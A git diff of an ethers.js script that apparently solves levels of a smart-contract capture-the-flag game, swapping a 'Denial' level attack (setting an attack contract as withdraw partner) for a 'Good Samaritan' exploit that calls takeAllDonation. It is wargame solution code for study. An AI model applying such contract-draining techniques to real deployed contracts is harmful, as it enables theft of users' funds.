@@ -2,19 +2,17 @@
 import { ethers } from 'ethers';
 import { BigNumber, Signer, BytesLike } from "ethers";
 import { getSigner } from "./signer";
-import { DenialAttack__factory, Denial__factory } from "../typechain";
+import { GoodSamaritanExploit__factory, GoodSamaritan__factory } from "../typechain";
 import { createLevel, submitLevel } from './utils';
 
 async function main() {
   const signer = getSigner();
-  const level =await createLevel(signer,"denial")
-
-  const denial = await (new DenialAttack__factory(signer)).deploy(level);
-  const target = Denial__factory.connect(level, signer);
-
-  await (await target.setWithdrawPartner(denial.address)).wait();
-  await target.withdraw({ gasLimit: 1000000 });
-  await submitLevel(signer,level)
+  const level =await createLevel(signer,"Good Samaritan");
+  // deploy the contract
+  const exploiter = await new GoodSamaritanExploit__factory(signer).deploy(level);
+  await (await exploiter.takeAllDonation()).wait();
+  console.log("Exploit done!");
+  await submitLevel(signer, level);
 }
 
 main()
